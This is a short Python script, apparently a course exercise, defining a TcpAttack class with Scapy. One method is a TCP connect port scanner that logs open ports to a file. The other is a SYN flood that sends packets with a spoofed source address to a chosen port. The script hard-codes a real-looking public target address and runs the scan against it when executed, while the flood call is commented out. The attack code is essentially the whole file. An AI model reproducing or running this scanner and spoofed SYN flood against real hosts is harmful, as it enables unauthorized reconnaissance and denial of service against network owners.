import sys, socket
import re
import os.path
from scapy.all import *

class TcpAttack:
    def __init__(self, spoofIP, targetIP):
        self.spoofIP = spoofIP
        self.targetIP = targetIP


    
    def scanTarget(self, rangeStart, rangeEnd):
        fp = open("openports.txt", "w")


        self.rangeStart = rangeStart
        self.rangeEnd = rangeEnd
        for testport in range(self.rangeStart, self.rangeEnd+1):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            
            try:
                sock.connect((self.targetIP, testport))
                
                
                print(testport)
                fp.write("%s\n" % testport)
            except:
                print("Port closed: %s" % testport)


        fp.close()
       

    
    def attackTarget(self, port, numSyn):
        #need to get source IP and destination IP

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.1)
        # print(sock.connect((self.targetIP, port)))
        # if not sock.connect((self.targetIP, port)):
        #     return 0
        print(port)
        print(self.targetIP)
        try:
            sock.connect((self.targetIP, port))
        except:
            return 0
        else:

            for i in range(numSyn):
                IP_header = IP(src = self.spoofIP, dst = self.targetIP)
                TCP_header = TCP(flags = "S", sport = RandShort(), dport = port)
                packet = IP_header / TCP_header
                try:
                    send(packet)
                except Exception as e:
                    print(e)
                    
            return 1
            print("hello3")

spoofIP = '10.1.1.1'
targetIP = '128.46.4.98'
#targetIP = '10.0.0.234'
Tcp= TcpAttack(spoofIP, targetIP)
Tcp.scanTarget(1, 1000)
# if not Tcp.attackTarget(22, 5):
#     print("nada")